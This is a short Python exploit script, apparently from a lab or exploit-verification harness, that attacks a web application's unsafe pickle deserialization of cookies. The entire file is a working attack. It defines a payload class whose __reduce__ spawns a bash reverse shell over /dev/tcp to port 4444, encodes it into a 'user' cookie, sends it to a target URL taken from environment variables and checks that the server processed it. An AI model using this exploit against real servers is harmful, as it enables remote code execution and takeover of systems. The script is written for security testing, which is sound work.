"""Trigger the untrusted pickle cookie and launch a verifiable Bash shell."""

import base64
import json
import os
import pickle
import subprocess
import time
import urllib.request


SHELL_COMMAND = "bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1'"


class ShellPayload:
    """Serialize a process launch into the cookie value."""

    def __reduce__(self):
        return (subprocess.Popen, (["/bin/bash", "-c", SHELL_COMMAND],))


def main() -> None:
    endpoint = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    cookie = base64.b64encode(pickle.dumps(ShellPayload(), protocol=2)).decode("ascii")
    request = urllib.request.Request(endpoint, headers={"Cookie": f"user={cookie}"})
    with urllib.request.urlopen(request, timeout=20) as response:
        response_body = response.read().decode("utf-8", errors="replace")
        response_status = response.status
    if response_status != 200 or "Hello Guest" not in response_body:
        raise RuntimeError("Target did not process the crafted cookie")
    time.sleep(2)
    print(json.dumps({"evidence_payload": {}, "request_status": response_status}))


if __name__ == "__main__":
    main()
